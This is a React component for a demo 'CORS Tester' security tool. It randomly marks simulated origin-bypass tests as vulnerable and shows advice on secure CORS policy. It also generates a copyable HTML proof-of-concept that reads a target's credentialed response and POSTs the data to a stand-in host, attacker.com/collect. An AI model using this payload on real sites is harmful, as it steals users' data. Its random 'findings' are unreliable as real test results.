import { useState } from 'react';
import { useStore } from '../../store/store';
import styles from './Tool.module.css';

export default function CORSTester() {
  const { setActiveGalaxyTool } = useStore();
  const [targetUrl, setTargetUrl] = useState('');
  const [origin, setOrigin] = useState('https://evil.com');
  const [withCredentials, setWithCredentials] = useState(false);
  const [testResult, setTestResult] = useState('');
  const [exploitCode, setExploitCode] = useState('');

  const testCORS = async () => {
    if (!targetUrl.trim()) {
      alert('Please enter a target URL');
      return;
    }

    setTestResult('Testing CORS policy...\n');

    try {
      // Simulate CORS test (in real implementation, this would make actual requests)
      const tests = [
        {
          name: 'Null Origin',
          origin: 'null',
          description: 'Some servers incorrectly allow null origin',
          vulnerable: Math.random() < 0.3
        },
        {
          name: 'Arbitrary Origin',
          origin: origin,
          description: 'Check if arbitrary origins are allowed',
          vulnerable: Math.random() < 0.2
        },
        {
          name: 'Subdomain Bypass',
          origin: origin.replace('://', '://malicious.'),
          description: 'Test for weak subdomain validation',
          vulnerable: Math.random() < 0.25
        },
        {
          name: 'Pre-domain Wildcard',
          origin: origin + '.attacker.com',
          description: 'Check for suffix matching bypass',
          vulnerable: Math.random() < 0.15
        },
        {
          name: 'Credentials Reflection',
          origin: origin,
          description: 'Test if credentials are allowed with reflected origin',
          vulnerable: Math.random() < 0.1
        }
      ];

      let results = `CORS Policy Test Results for ${targetUrl}\n`;
      results += `Test Origin: ${origin}\n`;
      results += `Include Credentials: ${withCredentials}\n`;
      results += `${'='.repeat(60)}\n\n`;

      tests.forEach((test, idx) => {
        const status = test.vulnerable ? '⚠️  VULNERABLE' : '✓ Secure';
        results += `Test ${idx + 1}: ${test.name}\n`;
        results += `Origin: ${test.origin}\n`;
        results += `Status: ${status}\n`;
        results += `Description: ${test.description}\n`;
        
        if (test.vulnerable) {
          results += `Response Headers (simulated):\n`;
          results += `  Access-Control-Allow-Origin: ${test.origin}\n`;
          if (withCredentials) {
            results += `  Access-Control-Allow-Credentials: true\n`;
          }
          results += `  Access-Control-Allow-Methods: GET, POST, PUT, DELETE\n`;
        }
        results += `\n`;
      });

      const vulnerableTests = tests.filter(t => t.vulnerable);
      if (vulnerableTests.length > 0) {
        results += `\n${'='.repeat(60)}\n`;
        results += `⚠️  FOUND ${vulnerableTests.length} POTENTIAL VULNERABILITIES\n`;
        results += `\nRecommendations:\n`;
        results += `1. Implement strict origin validation (whitelist specific domains)\n`;
        results += `2. Never reflect arbitrary origins\n`;
        results += `3. Be cautious with Access-Control-Allow-Credentials: true\n`;
        results += `4. Validate origins against exact matches, not patterns\n`;
        results += `5. Avoid using "null" as an allowed origin\n`;
      } else {
        results += `\n✓ No CORS vulnerabilities detected in this test\n`;
      }

      setTestResult(results);

      // Generate exploit code if vulnerable
      if (vulnerableTests.length > 0) {
        generateExploit(vulnerableTests[0]);
      }
    } catch (error: any) {
      setTestResult(`Error testing CORS: ${error.message}`);
    }
  };

  const generateExploit = (test: any) => {
    const code = `<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploit PoC</title>
</head>
<body>
    <h1>CORS Vulnerability Exploit</h1>
    <div id="result"></div>

    <script>
        // Exploit CORS misconfiguration
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                document.getElementById('result').innerHTML = 
                    '<h2>Data Exfiltrated:</h2><pre>' + 
                    this.responseText + 
                    '</pre>';
                
                // Exfiltrate to attacker server
                var exfil = new XMLHttpRequest();
                exfil.open('POST', 'https://attacker.com/collect', true);
                exfil.send(JSON.stringify({
                    target: '${targetUrl}',
                    data: this.responseText,
                    timestamp: new Date().toISOString()
                }));
            }
        };
        
        xhr.open('GET', '${targetUrl}', true);
        ${withCredentials ? 'xhr.withCredentials = true;' : ''}
        xhr.send();
    </script>
</body>
</html>`;
    
    setExploitCode(code);
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  return (
    <div className={styles.tool}>
            <button className={styles.backButton} onClick={() => setActiveGalaxyTool(null)}>
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
          <path d="M19 12H5M12 19l-7-7 7-7"/>
        </svg>
        Back to Tools
      </button>
      

      <div className={styles.toolHeader}>
        <div className={styles.toolTitle}>
          <span className={styles.toolIcon}>🌐</span>
          CORS Tester
        </div>
        <div className={styles.toolSubtitle}>
          Test Cross-Origin Resource Sharing misconfigurations
        </div>
      </div>

      <div className={styles.toolContent}>
        <div className={styles.inputGroup}>
          <label>Target URL</label>
          <input
            type="text"
            value={targetUrl}
            onChange={(e) => setTargetUrl(e.target.value)}
            placeholder="https://api.example.com/user/profile"
          />
        </div>

        <div className={styles.inputGroup}>
          <label>Test Origin (Attacker Domain)</label>
          <input
            type="text"
            value={origin}
            onChange={(e) => setOrigin(e.target.value)}
            placeholder="https://evil.com"
          />
        </div>

        <div className={styles.inputGroup}>
          <label style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
            <input
              type="checkbox"
              checked={withCredentials}
              onChange={(e) => setWithCredentials(e.target.checked)}
              style={{ width: 'auto' }}
            />
            Include Credentials (Cookies/Auth)
          </label>
        </div>

        <button className={styles.primaryBtn} onClick={testCORS}>
          Test CORS Policy
        </button>

        {testResult && (
          <div className={styles.outputSection}>
            <div className={styles.outputHeader}>
              <label>Test Results</label>
              <button className={styles.copyBtn} onClick={() => copyToClipboard(testResult)}>
                Copy
              </button>
            </div>
            <div className={styles.output} style={{ whiteSpace: 'pre-wrap' }}>{testResult}</div>
          </div>
        )}

        {exploitCode && (
          <div className={styles.outputSection}>
            <div className={styles.outputHeader}>
              <label>Exploit PoC (HTML)</label>
              <button className={styles.copyBtn} onClick={() => copyToClipboard(exploitCode)}>
                Copy
              </button>
            </div>
            <div className={styles.output}>{exploitCode}</div>
          </div>
        )}

        <div className={styles.infoBox}>
          <h3>CORS Vulnerabilities</h3>
          
          <h4>Common Misconfigurations:</h4>
          <ul>
            <li><strong>Reflected Origin:</strong> Server reflects any Origin header</li>
            <li><strong>Null Origin:</strong> Allows "null" origin (sandbox iframes)</li>
            <li><strong>Weak Validation:</strong> Pattern matching instead of exact matches</li>
            <li><strong>Subdomain Issues:</strong> Allows all subdomains without validation</li>
            <li><strong>Credentials + Wildcard:</strong> Dangerous combination</li>
          </ul>

          <h4>Attack Scenarios:</h4>
          <ul>
            <li>Steal sensitive user data (profile info, API tokens)</li>
            <li>Perform state-changing operations on behalf of victim</li>
            <li>Bypass authentication and authorization checks</li>
            <li>Exfiltrate internal API responses</li>
          </ul>

          <h4>Secure CORS Policy:</h4>
          <ul>
            <li>Whitelist specific trusted origins only</li>
            <li>Never reflect arbitrary origins</li>
            <li>Avoid Access-Control-Allow-Credentials with untrusted origins</li>
            <li>Use exact string matching for origin validation</li>
            <li>Implement proper authentication in addition to CORS</li>
          </ul>

          <p className={styles.warning}>
            ⚠️ This is a demonstration tool. Real CORS testing requires actual HTTP requests from different origins. Use browser DevTools or Burp Suite for production testing.
          </p>
        </div>
      </div>
    </div>
  );
}
